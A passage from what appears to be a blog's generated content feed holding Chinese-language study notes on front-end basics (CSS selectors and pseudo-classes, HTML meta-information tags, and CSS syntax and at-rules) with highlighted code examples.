class="line">  stroke:blue;</span><br><span class="line">  stroke-width:<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.mycls &#123;</span><br><span class="line">  font-size:<span class="number">40</span>px</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这两个选择器都是在属性选择器之前就设计出来的选择器，属性选择器出来了以后，理论上可以一定程度上替代它们。但是要注意，class 选择器识别的是：用空格分隔的 class 语法。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">a</span> class=<span class="string">&quot;a b c&quot;</span>&gt;xxx&lt;/a&gt;</span><br><span class="line"><span class="selector-class">.a</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>:red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，我们使用了用空格分隔的 class 属性，使用“.a”“.b”或者“.c”都能够选中元素，也可以使用多个 class 选择器来要求元素具有多个类。</p><h2 id="属性选择器"><a href="#属性选择器" class="headerlink" title="属性选择器"></a>属性选择器</h2><p>属性选择器根据 HTML 元素的属性来选中元素。属性选择器有四种形态。</p><ul><li>第一种，[att]<br>直接在方括号中放入属性名，是检查元素是否具有这个属性，只要元素有这个属性，不论属性是什么值，都可以被选中。</li><li>第二种，[att&#x3D;val]<br>精确匹配，检查一个元素属性的值是否是 val。</li><li>第三种，[att~&#x3D;val]<br>多种匹配，检查一个元素的值是否是若干值之一，这里的 val 不是一个单一的值了，可以是用空格分隔的一个序列。</li><li>第四种，[att|&#x3D;val]<br>开头匹配，检查一个元素的值是否是以 val 开头，它跟精确匹配的区别是属性只要以 val 开头即可，后面内容不管。</li></ul><p>有些 HTML 属性含有特殊字符，这个时候，可以把 val 用引号括起来，形成一个 CSS 字符串。CSS 字符串允许使用单双引号来规避特殊字符，也可以用反斜杠转义，这样，就可以表示出任意属性值啦。</p><h2 id="伪类选择器"><a href="#伪类选择器" class="headerlink" title="伪类选择器"></a>伪类选择器</h2><p>接下来我们开始介绍伪类选择器，伪类选择器是一系列由 CSS 规定好的选择器，它们以冒号开头。伪类选择器有普通型和函数型两种。</p><p>我们首先来介绍一下伪类中最常用的部分：树结构关系伪类。</p><h2 id="树结构关系伪类选择器"><a href="#树结构关系伪类选择器" class="headerlink" title="树结构关系伪类选择器"></a>树结构关系伪类选择器</h2><p>:root 伪类表示树的根元素，在选择器是针对完整的 HTML 文档情况，我们一般用 HTML 标签即可选中根元素。但是随着 scoped css 和 shadow root 等场景出现，选择器可以针对某一子树来选择，这时候就很需要 root 伪类了。</p><ul><li>:empty 伪类表示没有子节点的元素，这里有个例外就是子节点为空白文本节点的情况。</li><li>:nth-child 和 :nth-last-child 这是两个函数型的伪类，CSS 的 An+B 语法设计的是比较复杂的，我们这里仅仅介绍基本用法。我们还是看几个例子：<br><img src="/Blog/2019/01/30/relearn_FE/16%E4%B8%A8HTML&CSS%EF%BC%9ACSS%20%E9%80%89%E6%8B%A9%E5%99%A8/index/img_1.png"></li><li>:nth-last-child 的区别仅仅是从后往前数。</li><li>:first-child :last-child 分别表示第一个和最后一个元素。</li><li>:only-child 按字面意思理解即可，选中唯一一个子元素。</li></ul><p>of-type 系列，是一个变形的语法糖，S:nth-of-type(An+B) 是:nth-child(|An+B| of S) 的另一种写法。</p><p>以此类推，还有 nth-last-of-type、first-of-type、last-of-type、only-of-type。</p><h2 id="链接与行为伪类选择器"><a href="#链接与行为伪类选择器" class="headerlink" title="链接与行为伪类选择器"></a>链接与行为伪类选择器</h2><p>链接与行为是第一批设计出来的伪类，也是最常用的一批。</p><ul><li>:any-link 表示任意的链接，包括 a、area 和 link 标签都可能匹配到这个伪类。</li><li>:link 表示未访问过的链接， :visited 表示已经访问过的链接。</li><li>:hover 表示鼠标悬停在上的元素。</li><li>:active 表示用户正在激活这个元素，如用户按下按钮，鼠标还未抬起时，这个按钮就处于激活状态。</li><li>:focus 表示焦点落在这个元素之上。</li><li>:target 用于选中浏览器 URL 的 hash 部分所指示的元素。</li></ul><p>在 Selector Level 4 草案中，还引入了 target-within、focus-within 等伪类，用于表示 target 或者 focus 的父容器。</p><h2 id="逻辑伪类选择器"><a href="#逻辑伪类选择器" class="headerlink" title="逻辑伪类选择器"></a>逻辑伪类选择器</h2><p>我们这里介绍一个逻辑伪类 —— :not 伪类。</p><p>这个伪类是个函数型伪类，它的作用时选中内部的简单选择器命中的元素。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*|*<span class="symbol">:not</span>(<span class="symbol">:hover</span>)</span><br></pre></td></tr></table></figure><p>选择器 3 级标准中，not 只支持简单选择器，在选择器 4 级标准，则允许 not 接受一个选择器列表，这意味着选择器支持嵌套，仅靠 not 即可完成选择器的一阶真值逻辑完备，但目前还没有看到浏览器实现它。</p><p>在 Selector Level 4 草案中，还引入了:is :where :has 等逻辑伪类，但是它们有一些违背了选择器匹配 DOM 树不回溯的原则，所以这部分设计最终的命运如何还不太确定。</p><h2 id="其它伪类选择器"><a href="#其它伪类选择器" class="headerlink" title="其它伪类选择器"></a>其它伪类选择器</h2><p>还有一些草案中或者不常用的选择器，你仅做大概了解即可。</p><ul><li>国际化：用于处理国际化和多语言问题。<ul><li>dir</li><li>lang</li></ul></li><li>音频 &#x2F; 视频：用于区分音视频播放状态。<ul><li>play</li><li>pause</li></ul></li><li>时序：用于配合读屏软件等时序性客户端的伪类。<ul><li>current</li><li>past</li><li>future</li></ul></li><li>表格：用于处理 table 的列的伪类。<ul><li>nth-col</li><li>nth-last-col</li></ul></li></ul><p>伪类是很大的一类简单选择器，它是选择器能力的一种补充。在实际使用中，我还是建议你尽量通过合适的 id 和 class 来标识元素，约束伪类的使用。最好只在不得不使用伪类的场景使用伪类，这对于 CSS 代码的性能和可读性都有好处。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><ul><li>类型选择器：根据一个元素的标签名来选中元素。</li><li>全体选择器：与类型选择器类似，选择任意元素。</li><li>id 选择器：# 后面跟随 id 名。</li><li>class 选择器：. 后面跟随 class 名。</li><li>伪类选择器：一系列由 CSS 规定好的选择器，它们以冒号开头，伪类有普通型和函数型。</li></ul>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>15丨HTML&amp;CSS：HTML元信息类标签</title>
      <link href="/Blog/2019/01/30/relearn_FE/15%E4%B8%A8HTML&amp;CSS%EF%BC%9AHTML%E5%85%83%E4%BF%A1%E6%81%AF%E7%B1%BB%E6%A0%87%E7%AD%BE/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/15%E4%B8%A8HTML&amp;CSS%EF%BC%9AHTML%E5%85%83%E4%BF%A1%E6%81%AF%E7%B1%BB%E6%A0%87%E7%AD%BE/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>我们可以先来了解一下什么是元信息类标签。所谓元信息，是指描述自身的信息，元信息类标签，就是 HTML 用于描述文档自身的一类标签，它们通常出现在 head 标签中，一般都不会在页面被显示出来（与此相对，其它标签，如语义类标签，描述的是业务）。</p><p>元信息多数情况下是给浏览器、搜索引擎等机器阅读的，有时候这些信息会在页面之外显示给用户，有时候则不会。</p></blockquote><h3 id="head-标签"><a href="#head-标签" class="headerlink" title="head 标签"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/head">head 标签</a></h3><p>首先我们先来了解一下 <code>head</code> 标签，<code>head</code> 标签本身并<strong>不携带任何信息</strong>，它主要是作为盛放其它语义类标签的容器使用。</p><p>head 标签规定了自身必须是 html 标签中的第一个标签，它的内容<strong>必须包含一个 title</strong>，并且最多只能包含一个 base。如果文档作为 iframe，或者有其他方式指定了文档标题时，可以允许不包含 <code>title</code> 标签。</p><h3 id="title-标签"><a href="#title-标签" class="headerlink" title="title 标签"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/title">title 标签</a></h3><p>你还记得吗，我们的语义类标签中也有一组表示标题的标签：<code>h1-h6</code>。</p><p><code>heading</code> 和 <code>title</code> 两个英文单词意义区分十分微妙，在中文中更是找不到对应的词汇来区分。但是实际使用中，两者确实有一定区别。</p><blockquote><p>在 <code>HTML</code> 标准中，特意讨论了这个问题。我们思考一下，假设有一个介绍蜜蜂跳舞求偶仪式的科普页面，我们试着把以下两个文字分别对应到 <code>title</code> 和 <code>h1</code>。</p><ul><li>蜜蜂求偶仪式舞蹈</li><li>舞蹈</li></ul><p>在听 &#x2F; 看正确答案前，你不妨先想想，自己的答案是什么呢？为什么？</p></blockquote><p>好了，思考之后，我们来看看正确答案。正确答案是“蜜蜂求偶仪式舞蹈”放入 <code>title</code>，“舞蹈”放入 <code>h1</code>。</p><p>我来讲一讲为什么要这样放呢？这主要是考虑到 <code>title</code> 作为元信息，可能会被用在浏览器收藏夹、微信推送卡片、微博等各种场景，这时侯往往是上下文缺失的，所以 <strong><code>title</code> 应该是完整地概括整个网页内容的</strong>。</p><p><strong>而 <code>h1</code> 则仅仅用于页面展示</strong>，它可以默认具有上下文，并且有链接辅助，所以可以简写，即便无法概括全文，也不会有很大的影响。</p><h3 id="base-标签"><a href="#base-标签" class="headerlink" title="base 标签"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/base">base 标签</a></h3><p><code>base</code> 标签实际上是个<strong>历史遗留标签</strong>。它的作用是给页面上所有的 URL 相对地址提供一个基础。</p><p><code>base</code> 标签<strong>最多只有一个</strong>（若有多个就使用第一个），它改变全局的链接地址，它是一个非常危险的标签，容易造成跟 JavaScript 的配合问题，所以在实际开发中，我比较建议你使用 JavaScript 来代替 base 标签。</p><h3 id="meta-标签"><a href="#meta-标签" class="headerlink" title="meta 标签"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/meta">meta 标签</a></h3><p>在 <code>head</code> 中可以出现任意多个 <code>meta</code> 标签。<strong>一般的 <code>meta</code> 标签由 <code>name</code> 和 <code>content</code> 两个属性来定义</strong>。<code>name</code> 表示元信息的名，<code>content</code> 则用于表示元信息的值。</p><h5 id="具有-http-equiv-属性的-meta"><a href="#具有-http-equiv-属性的-meta" class="headerlink" title="具有 http-equiv 属性的 meta"></a>具有 http-equiv 属性的 meta</h5><p>具有 <code>http-equiv</code> 属性的 <code>meta</code> 标签，表示执行一个命令，这样的 <code>meta</code> 标签可以不需要 <code>name</code> 属性了。</p><p>例如，下面一段代码，相当于添加了 <code>content-type</code> 这个 <code>http</code> 头，并且指定了 <code>http</code> 编码方式。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta <span class="attribute">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attribute">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>除了 <code>content-type</code>，还有以下几种命令：</p><ul><li>content-language 指定内容的语言；</li><li>default-style 指定默认样式表；</li><li>refresh 刷新；</li><li>set-cookie 模拟 http 头 set-cookie，设置 cookie；</li><li>x-ua-compatible 模拟 http 头 x-ua-compatible，声明 ua 兼容性；</li><li>content-security-policy 模拟 http 头 content-security-policy，声明内容安全策略。</li></ul><h4 id="name-为-viewport-的-meta"><a href="#name-为-viewport-的-meta" class="headerlink" title="name 为 viewport 的 meta"></a>name 为 viewport 的 meta</h4><p>实际上，meta 标签可以被<strong>自由定义</strong>，只要写入和读取的双方约定好 <code>name</code> 和 <code>content</code> 的格式就可以了。</p><p>我们来介绍一个 <code>meta</code> 类型，它<strong>没有在 <code>HTML</code> 标准中定义，却是移动端开发的事实标准</strong>：它就是 name 为 <code>viewport</code> 的 <code>meta</code>。</p><blockquote><p>orz <code>viewport</code> 竟然是自定义的</p></blockquote><p>这类 <code>meta</code> 的 <code>name</code> 属性为 <code>viewport</code>，它的 <code>content</code> 是一个复杂结构，是用逗号分隔的键值对，键值对的格式是 <code>key=value</code>。</p><p>它能表示的全部属性如下：</p><ul><li>width：页面宽度，可以取值具体的数字，也可以是 device-width，表示跟设备宽度相等。</li><li>height：页面高度，可以取值具体的数字，也可以是 device-height，表示跟设备高度相等。</li><li>initial-scale：初始缩放比例。</li><li>minimum-scale：最小缩放比例。</li><li>maximum-scale：最大缩放比例。</li><li>user-scalable：是否允许用户缩放。</li></ul><p>对于已经做好了移动端适配的网页，应该把用户缩放功能禁止掉，宽度设为设备宽度，一个标准的 <code>meta</code> 如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta <span class="attribute">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attribute">content</span>=<span class="string">&quot;width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="其它预定义的-meta"><a href="#其它预定义的-meta" class="headerlink" title="其它预定义的 meta"></a>其它预定义的 meta</h4><p>在 HTML 标准中，还定义了一批 <code>meta</code> 标签的 <code>name</code>，可以视为一种有约定的 <code>meta</code>，我在这里列出来，你可以简单了解一下。</p><p>application-name：如果页面是 Web application，用这个标签表示应用名称。</p><ul><li>author: 页面作者。</li><li>description：页面描述，这个属性可能被用于搜索引擎或者其它场合。</li><li>generator: 生成页面所使用的工具，主要用于可视化编辑器，如果是手写 HTML 的网页，不需要加这个 meta。</li><li>keywords: 页面关键字，对于 SEO 场景非常关键。</li><li>referrer: 跳转策略，是一种安全考量。</li><li>theme-color: 页面风格颜色，实际并不会影响页面，但是浏览器可能据此调整页面之外的 UI（如窗口边框或者 tab 的颜色）。</li></ul><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>另一些元信息仅仅是对页面的描述，掌握它们可以使我们编写的页面跟各种浏览器、搜索引擎等结合地更好。</p><p>主要包括下面这些内容。</p><ul><li>head：元信息的容器。</li><li>title：文档标题。</li><li>base：页面的基准 URL。</li><li>meta: 元信息通用标签。</li></ul><h5 id="拓展一些"><a href="#拓展一些" class="headerlink" title="拓展一些"></a>拓展一些</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge,chrome=1&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 默认使用最新浏览器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Cache-Control&quot;</span> <span class="attr">content</span>=<span class="string">&quot;no-siteapp&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 不被网页(加速)转码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;robots&quot;</span> <span class="attr">content</span>=<span class="string">&quot;index,follow&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 搜索引擎抓取 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;renderer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;webkit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;apple-mobile-web-app-capable&quot;</span> <span class="attr">content</span>=<span class="string">&quot;yes&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 删除苹果默认的工具栏和菜单栏 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;apple-mobile-web-app-status-bar-style&quot;</span> <span class="attr">content</span>=<span class="string">&quot;black-translucent&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 设置苹果工具栏颜色 --&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>14丨HTML&amp;CSS：CSS语法</title>
      <link href="/Blog/2019/01/30/relearn_FE/14%E4%B8%A8HTML&amp;CSS%EF%BC%9ACSS%E8%AF%AD%E6%B3%95/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/14%E4%B8%A8HTML&amp;CSS%EF%BC%9ACSS%E8%AF%AD%E6%B3%95/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>CSS 是前端工程师几乎每天都要用的技术了，不过 CSS 的学习资料却是最糟糕的。</p><p>来看 W3C 提供的标准文档<br><a href="https://www.w3.org/TR/?title=css">https://www.w3.org/TR/?title=css</a><br><a href="https://www.w3.org/TR/css-syntax-3/">https://www.w3.org/TR/css-syntax-3/</a></p></blockquote><p>我们拿到这份标准可以看到，去除空格、HTML 注释等无效信息，CSS 的顶层样式表由两种规则组成的规则列表构成，一种被称为 at-rule，也就是 <strong>at 规则</strong>，另一种是 qualified rule，也就是<strong>普通规则</strong>。</p><h2 id="at-规则"><a href="#at-规则" class="headerlink" title="at 规则"></a>at 规则</h2><p>好了，现在我们已经知道了，CSS 语法的整体结构，接下来我们要做的是一个体力活，从所有的 CSS 标准里找到所有可能的 at-rule（不用谢，我已经帮你找好了，如果页面定位不准，你可以打开页面搜索关键字）。</p><ul><li>@charset ： <a href="https://www.w3.org/TR/css-syntax-3/">https://www.w3.org/TR/css-syntax-3/</a></li><li>@import ：<a href="https://www.w3.org/TR/css-cascade-4/">https://www.w3.org/TR/css-cascade-4/</a></li><li>@media ：<a href="https://www.w3.org/TR/css3-conditional/">https://www.w3.org/TR/css3-conditional/</a></li><li>@page ： <a href="https://www.w3.org/TR/css-page-3/">https://www.w3.org/TR/css-page-3/</a></li><li>@counter-style ：<a href="https://www.w3.org/TR/css-counter-styles-3">https://www.w3.org/TR/css-counter-styles-3</a></li><li>@keyframes ：<a href="https://www.w3.org/TR/css-animations-1/">https://www.w3.org/TR/css-animations-1/</a></li><li>@fontface ：<a href="https://www.w3.org/TR/css-fonts-3/">https://www.w3.org/TR/css-fonts-3/</a></li><li>@supports ：<a href="https://www.w3.org/TR/css3-conditional/">https://www.w3.org/TR/css3-conditional/</a></li><li>@namespace ：<a href="https://www.w3.org/TR/css-namespaces-3/">https://www.w3.org/TR/css-namespaces-3/</a></li></ul><p>这里的每一种 @规则背后，都是一组 CSS 的知识。在我们的课程中，有些会重点介绍，不过，为了先给你建立起一个整体的认知，我们这里会给所有的 @规则提供一些简单的例子和介绍。</p><h3 id="charset"><a href="#charset" class="headerlink" title="@charset"></a>@charset</h3><p>@charset 用于提示 CSS 文件使用的字符编码方式，它如果被使用，必须出现在最前面。这个规则只在给出语法解析阶段前使用，并不影响页面上的展示效果。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@charset</span> <span class="string">&quot;utf-8&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="import"><a href="#import" class="headerlink" title="@import"></a>@import</h3><p>@import 用于引入一个 CSS 文件，除了 @charset 规则不会被引入，@import 可以引入另一个文件的全部内容。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@import</span> <span class="string">&quot;mystyle.css&quot;</span>;</span><br><span class="line"><span class="keyword">@import</span> url(<span class="string">&quot;mystyle.css&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">import</span> [ <span class="language-xml"><span class="tag">&lt;<span class="name">url</span>&gt;</span> | </span><span class="language-xml"><span class="tag">&lt;<span class="name">string</span>&gt;</span> ]</span></span><br><span class="line"><span class="language-xml">        [ supports( [ </span><span class="language-xml"><span class="tag">&lt;<span class="name">supports-condition</span>&gt;</span> | </span><span class="language-xml"><span class="tag">&lt;<span class="name">declaration</span>&gt;</span> ] ) ]?</span></span><br><span class="line"><span class="language-xml">        </span><span class="language-xml"><span class="tag">&lt;<span class="name">media-query-list</span>&gt;</span>? ;</span></span><br></pre></td></tr></table></figure><p>通过代码，我们可以看出，import 还支持 supports 和 media query 形式。</p><h3 id="media"><a href="#media" class="headerlink" title="@media"></a>@media</h3><p>media 就是大名鼎鼎的 media query 使用的规则了，它能够对设备的类型进行一些判断。在 media 的区块内，是普通规则列表。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@media</span> print &#123;</span><br><span class="line">    <span class="selector-tag">body</span> &#123; <span class="attribute">font-size</span>: <span class="number">10pt</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="page"><a href="#page" class="headerlink" title="@page"></a>@page</h3><p>page 用于分页媒体访问网页时的表现设置，页面是一种特殊的盒模型结构，除了页面本身，还可以设置它周围的盒。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@page</span> &#123;</span><br><span class="line">  size: 8.5in 11in;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">10%</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">@top-left</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&quot;Hamlet&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">@top-right</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&quot;Page &quot;</span> <span class="built_in">counter</span>(page);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="counter-style"><a href="#counter-style" class="headerlink" title="@ counter-style"></a>@ counter-style</h3><p>counter-style 产生一种数据，用于定义列表项的表现。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@counter-style</span> triangle &#123;</span><br><span class="line">  system: cyclic;</span><br><span class="line">  symbols: ‣;</span><br><span class="line">  suffix: <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="key-frames"><a href="#key-frames" class="headerlink" title="@ key-frames"></a>@ key-frames</h3><p>keyframes 产生一种数据，用于定义动画关键帧。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@keyframes</span> diagonal-slide &#123;</span><br><span class="line"></span><br><span class="line">  <span class="selector-tag">from</span> &#123;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-tag">to</span> &#123;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">100px</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fontface"><a href="#fontface" class="headerlink" title="@ fontface"></a>@ fontface</h3><p>fontface 用于定义一种字体，icon font 技术就是利用这个特性来实现的。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: Gentium;</span><br><span class="line">  <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">http://example.com/fonts/Gentium.woff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">p</span> &#123; <span class="attribute">font-family</span>: Gentium, serif; &#125;</span><br></pre></td></tr></table></figure><h3 id="support"><a href="#support" class="headerlink" title="@ support"></a>@ support</h3><p>support 检查环境的特性，它与 media 比较类似。</p><h3 id="namespace"><a href="#namespace" class="headerlink" title="@ namespace"></a>@ namespace</h3><p>用于跟 XML 命名空间配合的一个规则，表示内部的 CSS 选择器全都带上特定命名空间。</p><h3 id="viewport"><a href="#viewport" class="headerlink" title="@ viewport"></a>@ viewport</h3><p>用于设置视口的一些特性，不过兼容性目前不是很好，多数时候被 HTML 的 meta 代替。</p><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>除了以上这些，还有些目前不太推荐使用的 at 规则。</p><ul><li>@color-profile 是 SVG1.0 引入的 CSS 特性，但是实现状况不怎么好。</li><li>@document 还没讨论清楚，被推迟到了 CSS4 中。</li><li>@font-feature-values 。</li></ul><h2 id="普通规则"><a href="#普通规则" class="headerlink" title="普通规则"></a>普通规则</h2><p>接下来我们进入 qualified rule，也就是普通规则的部分，看看这里有什么需要我们记住的内容。</p><p>qualified rule 主要是由选择器和声明区块构成。声明区块又由属性和值构成。我在下面的列表中，介绍了这部分语法的组成要点。</p><ul><li>普通规则<ul><li>选择器</li><li>声明列表<ul><li>属性</li><li>值<ul><li>值的类型</li><li>函数</li></ul></li></ul></li></ul></li></ul><h3 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h3><blockquote><p>我们先来看看选择器，它有一份独立的标准，我们可以参考这个网址：<br><a href="https://www.w3.org/TR/selectors-4/">https://www.w3.org/TR/selectors-4/</a><br>这份标准不在我们前面的过滤条件中，它属于 CSS 和 HTML 共用的标准。</p></blockquote><p>在选择器标准的最后，附有一张选择器的语法表，从这份语法表，我们可以理清楚记忆选择器的思路。</p><p>我们从语法结构可以看出，任何选择器，都是由几个符号结构连接的：空格、大于号、加号、波浪线、双竖线，这里需要注意一下，空格，即为后代选择器的优先级较低。</p><p>然后对每一个选择器来说，如果它不是伪元素的话，由几个可选的部分组成，标签类型选择器，id、class、属性和伪类，它们中只要出现一个，就构成了选择器。</p><p>如果它是伪元素，则在这个结构之后追加伪元素。伪类可以出现在伪元素之后。我在下面用一个列表（不太严谨地）整理了选择器的语法结构：</p><p><img src="/Blog/2019/01/30/relearn_FE/14%E4%B8%A8HTML&CSS%EF%BC%9ACSS%E8%AF%AD%E6%B3%95/index/img.png"></p><p>我们在这里可以参考一个示例图：</p><p><img src="/Blog/2019/01/30/relearn_FE/14%E4%B8%A8HTML&CSS%EF%BC%9ACSS%E8%AF%AD%E6%B3%95/index/img_1.png" alt="（语法结构分析示例）"></p><p>看完了选择器，我们继续来看看声明部分的语法。</p><h3 id="声明：属性和值"><a href="#声明：属性和值" class="headerlink" title="声明：属性和值"></a>声明：属性和值</h3><p>声明部分是一个由“属性: 值”组成的序列。</p><p><strong>属性</strong>是由中划线、下划线、字母等组成的标识符，CSS 还支持使用反斜杠转义。我们需要注意的是：属性不允许使用连续的两个中划线开头，这样的属性会被认为是 CSS 变量。</p><p>在<a href="https://www.w3.org/TR/css-variables/">CSS Variables</a> 标准中，以双中划线开头的属性被当作变量，与之配合的则是 var 函数：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-pseudo">:root</span> &#123;</span><br><span class="line">  <span class="attr">--main-color</span>: <span class="number">#06c</span>;</span><br><span class="line">  <span class="attr">--accent-color</span>: <span class="number">#006</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* The rest of the CSS file */</span></span><br><span class="line"><span class="selector-id">#foo</span> <span class="selector-tag">h1</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">var</span>(--main-color);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>值</strong>的部分，主要在标准 <a href="https://www.w3.org/TR/css-values-4/">CSS Values and Unit</a>，根据每个 CSS 属性可以取到不同的值，这里的值可能是字符串、标识符。</p><p>CSS 属性值可能是以下类型。</p><ul><li>CSS 范围的关键字：initial，unset，inherit，任何属性都可以的关键字。</li><li>字符串：比如 content 属性。</li><li>URL：使用 url() 函数的 URL 值。</li><li>整数 &#x2F; 实数：比如 flex 属性。</li><li>维度：单位的整数 &#x2F; 实数，比如 width 